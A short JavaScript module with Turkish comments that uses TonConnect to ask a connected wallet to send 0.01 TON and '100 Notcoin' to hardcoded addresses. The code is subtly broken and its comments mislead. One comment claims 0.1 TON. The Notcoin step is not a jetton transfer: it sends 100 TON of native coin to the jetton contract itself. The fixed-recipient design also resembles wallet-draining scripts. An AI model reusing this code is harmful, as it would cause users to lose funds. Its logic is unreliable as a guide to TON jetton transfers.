/* eslint-disable */
import TonWeb from 'tonweb'; // TonWeb kütüphanesini import ediyoruz
const tonweb = new TonWeb(); // TonWeb'i başlatıyoruz

const NOTCOIN_JETTON_CONTRACT = "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC"; // Notcoin jetton contract adresi

const request_transaction = async (tonConnectUI) => {
  try {
    console.log('Transaction talep ediliyor...');

    // Cüzdan adresini al
    const walletAddress = tonConnectUI.account?.address;
    if (!walletAddress) {
      console.error("Cüzdan adresi bulunamadı.");
      return; // Cüzdan adresi yoksa fonksiyonu bitir
    }

    console.log('Cüzdan adresi:', walletAddress);

    // Burada 0.1 TON ve 100 Notcoin talep ediyoruz
    const amountToRequestTON = 10000000; // 0.01 TON'u nanoTON cinsinden belirtin
    const amountToRequestNotcoin = 100; // 100 Notcoin

    // Hedef cüzdan adresini buraya yazın
    const targetAddress = "UQDKbP8AA8sYpdI5v4elb600P5f6tdXbOJrG3vEjnoAiHREB"; // Hedef cüzdan adresi

    // Talep mesajı
    const messages = [
      {
        address: targetAddress, // Hedef cüzdan adresi
        amount: amountToRequestTON, // Talep edilen TON miktarı
        payload: '', // Payload kısmını boş bırakıyoruz
      },
      {
        address: NOTCOIN_JETTON_CONTRACT, // Notcoin jetton contract adresi
        amount: amountToRequestNotcoin * 1e9, // Talep edilen Notcoin miktarını nano cinsinden belirtin
        payload: '', // Payload kısmını boş bırakıyoruz
      },
    ];

    console.log('Talep mesajları:', messages);

    // Transaction işlemini başlat
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 saniyelik geçerlilik süresi
      messages,
    };

    console.log('Transaction gönderiliyor...', transaction);

    // Transaction gönder
    const result = await tonConnectUI.sendTransaction(transaction);
    console.log('Transaction başarılı:', result);

  } catch (error) {
    console.error('Transaction hatası:', error);
    alert("Transaction gerçekleşmedi: " + error.message); // Hata mesajını kullanıcıya göster
  }
};

export { request_transaction };
